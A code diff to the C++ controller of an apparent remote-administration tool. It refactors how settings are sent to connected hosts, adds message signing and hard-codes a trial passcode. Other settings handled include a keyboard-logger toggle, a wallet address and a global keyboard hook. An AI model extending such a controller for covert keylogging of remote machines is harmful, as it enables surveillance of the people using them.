@@ -833,10 +833,18 @@ VOID CMy2015RemoteDlg::AddList(CString strIP, CString strAddr, CString strPCName
 
     CharMsg *title =  new CharMsg(_TR("主机上线"));
     CharMsg *text = new CharMsg(strIP + CString(tip.c_str()) + _T(" ") + _L(_T("主机上线")) + _T(" [") + loc + _T("]"));
+    // sign login message to let client verify the message is from trusted source
+    std::string signMessage(const std::string & privateKey, BYTE * msg, int len);
+    MasterSettings copy = m_settings;
+    std::string msg = startTime;
+    msg += "|" + std::to_string(ContextObject->GetClientID());
+    auto signature = signMessage("", (BYTE*)msg.c_str(), msg.length());
+    ASSERT(signature.size() <= sizeof(copy.Signature));
+    memcpy(copy.Signature, signature.data(), signature.size());
     LeaveCriticalSection(&m_cs);
     Mprintf("主机[%s]上线: %s[%s]\n", v[RES_CLIENT_PUBIP].empty() ? strIP : v[RES_CLIENT_PUBIP].c_str(),
             std::to_string(id).c_str(), loc);
-    SendMasterSettings(ContextObject);
+    SendMasterSettings(ContextObject, copy);
     if (m_needNotify && (GetTickCount() - g_StartTick > 30*1000))
         PostMessageA(WM_SHOWNOTIFY, WPARAM(title), LPARAM(text));
     else {
@@ -1134,7 +1142,7 @@ BOOL CMy2015RemoteDlg::OnInitDialog()
     }
 
     UPDATE_SPLASH(18, "正在初始化文件上传模块...");
-    int ret = InitFileUpload(GetHMAC(), 64, 50, Logf);
+    int ret = InitFileUpload({}, {}, GetHMAC(), 64, 50, Logf);
     g_hKeyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, AfxGetInstanceHandle(), 0);
 
     UPDATE_SPLASH(20, "正在加载IP数据库...");
@@ -2261,7 +2269,7 @@ void CMy2015RemoteDlg::OnMainSet()
     m_settings.ReportInterval = m;
     m_settings.DetectSoftware = n;
     m_CList_Online.SetColumn(ONLINELIST_VIDEO, &lvColumn);
-    SendMasterSettings(nullptr);
+    SendMasterSettings(nullptr, m_settings);
 }
 
 
@@ -2543,9 +2551,8 @@ BOOL CMy2015RemoteDlg::AuthorizeClient(const std::string& sn, const std::string&
     return IsDateInRange(list[0], list[1]);
 }
 
-BOOL IsTrail(const std::string& sn) {
-    auto id = getDeviceID("127.0.0.1");
-	return sn == id;
+BOOL IsTrail(const std::string& passcode) {
+	return passcode == "20260201-20280201-0020-be94-120d-20f9-919a";
 }
 
 VOID CMy2015RemoteDlg::MessageHandle(CONTEXT_OBJECT* ContextObject)
@@ -2970,7 +2977,7 @@ void CMy2015RemoteDlg::UpdateActiveWindow(CONTEXT_OBJECT* ctx)
         if (authorized) {
             Mprintf("%s HMAC 校验成功: %llu\n", hb.Passcode, hb.PwdHmac);
             m_ClientMap->SetClientMapInteger(host->GetClientID(), MAP_AUTH, TRUE);
-            isTrail = IsTrail(hb.SN);
+            isTrail = IsTrail(hb.Passcode);
             if (!isTrail) {
                 std::string tip = std::string(hb.Passcode) + std::string(_L("授权成功"));
                 tip += ": " + std::to_string(hb.PwdHmac) + "[" + std::string(ctx->GetClientData(ONLINELIST_IP)) + "]";
@@ -3024,10 +3031,10 @@ context* CMy2015RemoteDlg::FindHost(uint64_t id)
     return NULL;
 }
 
-void CMy2015RemoteDlg::SendMasterSettings(CONTEXT_OBJECT* ctx)
+void CMy2015RemoteDlg::SendMasterSettings(CONTEXT_OBJECT* ctx, const MasterSettings& m)
 {
     BYTE buf[sizeof(MasterSettings) + 1] = { CMD_MASTERSETTING };
-    memcpy(buf+1, &m_settings, sizeof(MasterSettings));
+    memcpy(buf+1, &m, sizeof(MasterSettings));
 
     if (ctx) {
         ctx->Send2Client(buf, sizeof(buf));
@@ -4193,7 +4200,7 @@ void CMy2015RemoteDlg::OnMainWallet()
     }
     strcpy(m_settings.WalletAddress, dlg.m_str);
     THIS_CFG.SetStr("settings", "wallet", m_settings.WalletAddress);
-    SendMasterSettings(nullptr);
+    SendMasterSettings(nullptr, m_settings);
 }
 
 
@@ -4774,7 +4781,7 @@ void CMy2015RemoteDlg::OnParamKblogger()
     CMenu* SubMenu = m_MainMenu.GetSubMenu(2);
     SubMenu->CheckMenuItem(ID_PARAM_KBLOGGER, m_settings.EnableKBLogger ? MF_CHECKED : MF_UNCHECKED);
     THIS_CFG.SetInt("settings", "KeyboardLog", m_settings.EnableKBLogger);
-    SendMasterSettings(nullptr);
+    SendMasterSettings(nullptr, m_settings);
 }
 
 
@@ -4811,7 +4818,7 @@ void CMy2015RemoteDlg::OnParamEnableLog()
     CMenu* SubMenu = m_MainMenu.GetSubMenu(2);
     SubMenu->CheckMenuItem(ID_PARAM_ENABLE_LOG, m_settings.EnableLog ? MF_CHECKED : MF_UNCHECKED);
     THIS_CFG.SetInt("settings", "EnableLog", m_settings.EnableLog);
-    SendMasterSettings(nullptr);
+    SendMasterSettings(nullptr, m_settings);
 }
 
 
